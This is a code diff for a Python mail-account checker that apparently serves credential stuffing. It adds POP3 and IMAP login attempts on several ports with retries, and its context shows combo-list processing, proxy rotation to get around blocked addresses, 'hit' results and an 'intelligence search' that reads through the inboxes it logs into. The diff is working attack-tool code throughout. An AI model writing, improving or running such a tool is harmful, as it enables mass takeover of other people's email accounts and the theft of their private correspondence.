@@ -468,6 +468,325 @@ class MailCheckerWorker(QObject):
                     pass
             return False, None, str(e)[:30]
 
+    def try_pop3_connection_with_custom_timeout(self, email_addr, password, server, port, use_ssl=True, timeout=5):
+        """Try POP3 connection with custom timeout and SSL option"""
+        if not self.is_running:
+            return False, None, 'stopped'
+        
+        pop_conn = None
+        try:
+            if use_ssl:
+                pop_conn = poplib.POP3_SSL(server, port, timeout=timeout, context=self.ssl_context)
+            else:
+                pop_conn = poplib.POP3(server, port, timeout=timeout)
+            
+            if not self.is_running:
+                try:
+                    pop_conn.quit()
+                except:
+                    pass
+                return False, None, 'stopped'
+            
+            pop_conn.user(email_addr)
+            pop_conn.pass_(password)
+            stat_response = pop_conn.stat()
+            message_count = stat_response[0] if stat_response else 0
+            pop_conn.quit()
+            return True, f"{message_count}msg", None
+            
+        except poplib.error_proto as e:
+            if pop_conn:
+                try:
+                    pop_conn.quit()
+                except:
+                    pass
+            return False, None, 'invalid'
+            
+        except (socket.timeout, TimeoutError):
+            if pop_conn:
+                try:
+                    pop_conn.quit()
+                except:
+                    pass
+            return False, None, 'timeout'
+            
+        except (ConnectionRefusedError, socket.gaierror, OSError):
+            if pop_conn:
+                try:
+                    pop_conn.quit()
+                except:
+                    pass
+            return False, None, 'connection_failed'
+            
+        except Exception as e:
+            if pop_conn:
+                try:
+                    pop_conn.quit()
+                except:
+                    pass
+            return False, None, str(e)[:30]
+
+    def try_pop3_with_adaptive_retry(self, email_addr, password, server, port, use_ssl=True):
+        """Intelligent adaptive timeout retry for POP3"""
+        base_timeout = self.settings['timeout']
+        max_retries = 1
+        
+        for attempt in range(max_retries + 1):
+            if not self.is_running:
+                return False, None, 'stopped'
+            
+            # Adaptive timeout: quick first try, then full timeout
+            if attempt == 0:
+                timeout_to_use = max(3, min(base_timeout * 0.5, 5))  # 3-5s first attempt
+            else:
+                timeout_to_use = base_timeout  # Full timeout on retry
+            
+            success, capture, error_type = self.try_pop3_connection_with_custom_timeout(
+                email_addr, password, server, port, use_ssl, timeout_to_use
+            )
+            
+            if success:
+                return True, capture, None
+            
+            if error_type == 'invalid':
+                return False, None, 'invalid'
+            
+            if error_type in ['timeout', 'connection_failed'] and attempt < max_retries:
+                time.sleep(0.3)  # Brief pause before retry
+                continue
+            
+            if attempt == max_retries:
+                return False, None, error_type
+        
+        return False, None, 'error'
+
+    def try_imap_connection_with_custom_timeout(self, email_addr, password, server, port, use_ssl=True, timeout=5):
+        """Try IMAP connection with custom timeout and SSL option"""
+        if not self.is_running:
+            return False, None, 'stopped'
+        
+        imap_conn = None
+        try:
+            if use_ssl:
+                imap_conn = imaplib.IMAP4_SSL(
+                    host=server, 
+                    port=port, 
+                    ssl_context=self.ssl_context, 
+                    timeout=timeout
+                )
+            else:
+                imap_conn = imaplib.IMAP4(host=server, port=port)
+                imap_conn.sock.settimeout(timeout)
+            
+            if not self.is_running:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+                return False, None, 'stopped'
+            
+            typ, data = imap_conn.login(email_addr, password)
+            
+            if typ == 'OK':
+                # Get mailbox info
+                try:
+                    imap_conn.select('INBOX', readonly=True)
+                    typ, data = imap_conn.search(None, 'ALL')
+                    if typ == 'OK' and data[0]:
+                        message_count = len(data[0].split())
+                    else:
+                        message_count = 0
+                    capture = f"{message_count}msg"
+                except:
+                    capture = "Valid"
+                
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+                return True, capture, None
+            else:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+                return False, None, 'invalid'
+                
+        except (imaplib.IMAP4.error, imaplib.IMAP4.abort):
+            if imap_conn:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+            return False, None, 'invalid'
+            
+        except (socket.timeout, TimeoutError):
+            if imap_conn:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+            return False, None, 'timeout'
+            
+        except (ConnectionRefusedError, socket.gaierror, OSError):
+            if imap_conn:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+            return False, None, 'connection_failed'
+            
+        except Exception as e:
+            if imap_conn:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+            return False, None, str(e)[:30]
+
+    def try_imap_with_adaptive_retry(self, email_addr, password, server, port, use_ssl=True):
+        """Intelligent adaptive timeout retry for IMAP"""
+        base_timeout = self.settings['timeout']
+        max_retries = 1
+        
+        for attempt in range(max_retries + 1):
+            if not self.is_running:
+                return False, None, 'stopped'
+            
+            # Adaptive timeout: quick first try, then full timeout
+            if attempt == 0:
+                timeout_to_use = max(5, min(base_timeout * 0.5, 8))  # 5-8s first attempt
+            else:
+                timeout_to_use = base_timeout  # Full timeout on retry
+            
+            success, capture, error_type = self.try_imap_connection_with_custom_timeout(
+                email_addr, password, server, port, use_ssl, timeout_to_use
+            )
+            
+            if success:
+                return True, capture, None
+            
+            if error_type == 'invalid':
+                return False, None, 'invalid'
+            
+            if error_type in ['timeout', 'connection_failed'] and attempt < max_retries:
+                time.sleep(0.3)  # Brief pause before retry
+                continue
+            
+            if attempt == max_retries:
+                return False, None, error_type
+        
+        return False, None, 'error'
+
+    def try_pop3_multi_port(self, email_addr, password, server):
+        """Try POP3 connection on multiple ports: 995 (SSL) → 110 (non-SSL)"""
+        if not self.is_running:
+            return False, None, 'stopped'
+        
+        # Try port 995 (SSL) first
+        success, capture, error = self.try_pop3_with_adaptive_retry(email_addr, password, server, 995, use_ssl=True)
+        if success:
+            return True, capture, None
+        
+        if error == 'invalid':
+            return False, None, 'invalid'
+        
+        if error == 'stopped':
+            return False, None, 'stopped'
+        
+        # Try port 110 (non-SSL) as fallback
+        success, capture, error = self.try_pop3_with_adaptive_retry(email_addr, password, server, 110, use_ssl=False)
+        if success:
+            return True, capture, None
+        
+        return False, None, error
+
+    def try_imap_multi_port(self, email_addr, password, server):
+        """Try IMAP connection on multiple ports: 993 (SSL) → 143 (non-SSL)"""
+        if not self.is_running:
+            return False, None, 'stopped'
+        
+        # Try port 993 (SSL) first
+        success, capture, error = self.try_imap_with_adaptive_retry(email_addr, password, server, 993, use_ssl=True)
+        if success:
+            return True, capture, None
+        
+        if error == 'invalid':
+            return False, None, 'invalid'
+        
+        if error == 'stopped':
+            return False, None, 'stopped'
+        
+        # Try port 143 (non-SSL) as fallback
+        success, capture, error = self.try_imap_with_adaptive_retry(email_addr, password, server, 143, use_ssl=False)
+        if success:
+            return True, capture, None
+        
+        return False, None, error
+
+    def try_imap_login_keep_connection_multi_port(self, email_addr, password, server):
+        """Try IMAP login on multiple ports and KEEP connection open for intelligence search"""
+        if not self.is_running:
+            return False, None, 'stopped'
+        
+        timeout = self.settings['timeout']
+        
+        # Try port 993 (SSL) first
+        success, imap_conn, error = self.try_imap_login_keep_connection(email_addr, password, server, 993, timeout)
+        if success:
+            return True, imap_conn, None
+        
+        if error == 'invalid':
+            return False, None, 'invalid'
+        
+        if error == 'stopped':
+            return False, None, 'stopped'
+        
+        # Try port 143 (non-SSL) as fallback
+        imap_conn = None
+        try:
+            imap_conn = imaplib.IMAP4(host=server, port=143)
+            imap_conn.sock.settimeout(timeout)
+            
+            if not self.is_running:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+                return False, None, 'stopped'
+            
+            typ, data = imap_conn.login(email_addr, password)
+            
+            if typ == 'OK':
+                return True, imap_conn, None
+            else:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+                return False, None, 'invalid'
+        except (imaplib.IMAP4.error, imaplib.IMAP4.abort):
+            if imap_conn:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+            return False, None, 'invalid'
+        except (socket.timeout, TimeoutError):
+            if imap_conn:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+            return False, None, 'timeout'
+        except Exception as e:
+            if imap_conn:
+                try:
+                    imap_conn.logout()
+                except:
+                    pass
+            return False, None, str(e)[:30]
+
     def _build_nested_or_query(self, criteria):
         """Build nested OR query for IMAP search - OPTIMIZED"""
         if not criteria:
@@ -808,40 +1127,33 @@ class MailCheckerWorker(QObject):
                 active_proxies = [p for p in self.proxies if p not in self.blocked_proxies]
                 if not active_proxies:
                     self.reload_proxies_if_needed()
-                    # Reload updates self.proxies, so recalculate active proxies
                     active_proxies = [p for p in self.proxies if p not in self.blocked_proxies]
                 if active_proxies:
                     proxy = random.choice(active_proxies)
                     self.setup_proxy(proxy)
             
-            timeout = self.settings['timeout']
+            # Get server for domain
+            pop_server, _ = self.server_manager.get_pop_server(domain)
+            imap_server, _ = self.server_manager.get_imap_server(domain)
             
             if self.intelligence_search:
-                # Intelligence ON: IMAP only + Email Search
-                imap_server, imap_port = self.server_manager.get_imap_server(domain)
-                success, imap_conn, error = self.try_imap_login_keep_connection(email_addr, password, imap_server, imap_port, timeout)
+                # Intelligence ON: IMAP only (multi-port) + Email Search
+                success, capture, error = self.try_imap_multi_port(email_addr, password, imap_server)
                 
                 if success:
-                    # ✅ CRITICAL FIX: Create immutable local snapshots for thread safety
-                    snapshot_email = str(email_addr)
-                    snapshot_password = str(password)
+                    # Open connection for intelligence search (try multi-port)
+                    success_intel, imap_conn, _ = self.try_imap_login_keep_connection_multi_port(
+                        email_addr, password, imap_server
+                    )
                     
-                    # ✅ Pass snapshots instead of original variables
-                    self.search_emails_for_intelligence(imap_conn, snapshot_email, snapshot_password)
-                    
-                    # Get message count
-                    try:
-                        imap_conn.select('INBOX', readonly=True)
-                        typ, data = imap_conn.search(None, 'ALL')
-                        message_count = len(data[0].split()) if typ == 'OK' and data[0] else 0
-                        capture = f"{message_count}msg"
-                    except:
-                        capture = "Valid"
-                    
-                    try:
-                        imap_conn.logout()
-                    except:
-                        pass
+                    if success_intel:
+                        snapshot_email = str(email_addr)
+                        snapshot_password = str(password)
+                        self.search_emails_for_intelligence(imap_conn, snapshot_email, snapshot_password)
+                        try:
+                            imap_conn.logout()
+                        except:
+                            pass
                     
                     return {
                         'status': 'hit',
@@ -857,9 +1169,8 @@ class MailCheckerWorker(QObject):
                     return {'status': 'error', 'combo': combo_str, 'reason': f'Error: {error}'}
             
             else:
-                # Intelligence OFF: POP3 first, then IMAP with 2-second delay
-                pop_server, pop_port = self.server_manager.get_pop_server(domain)
-                success, capture, error = self.try_pop3_login(email_addr, password, pop_server, pop_port, timeout)
+                # Intelligence OFF: POP3 first (multi-port), then IMAP (multi-port) with 2-second delay
+                success, capture, error = self.try_pop3_multi_port(email_addr, password, pop_server)
                 
                 if success:
                     return {
@@ -873,13 +1184,12 @@ class MailCheckerWorker(QObject):
                 elif error == 'stopped':
                     return None
                 
-                # If POP3 failed (timeout/error), wait 2 seconds and try IMAP
+                # If POP3 failed (timeout/error), wait 2 seconds and try IMAP (multi-port)
                 if error in ['timeout', 'connection_failed'] or error.startswith('Error'):
                     self.signals.log.emit(f"Waiting 2s before IMAP retry for {email_addr}...", QColor("#ff9800"))
                     time.sleep(2)
                     
-                    imap_server, imap_port = self.server_manager.get_imap_server(domain)
-                    success, capture, error = self.try_imap_login(email_addr, password, imap_server, imap_port, timeout)
+                    success, capture, error = self.try_imap_multi_port(email_addr, password, imap_server)
                     
                     if success:
                         return {
